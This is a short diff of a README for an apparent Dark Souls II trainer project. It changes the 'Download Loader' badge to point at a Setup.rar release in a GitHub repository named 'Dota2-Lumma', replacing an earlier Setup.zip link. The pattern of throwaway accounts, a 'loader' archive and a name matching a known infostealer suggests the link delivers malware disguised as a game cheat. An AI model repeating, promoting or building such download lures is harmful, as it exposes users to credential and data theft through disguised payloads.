@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Dark Souls II Trainer
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `Dark-Souls-II-Trainer` · Updated: 2026-11-02
 
 **Tags:** `dark-souls-2` `dark-souls-ii` `soulslike`
+
 
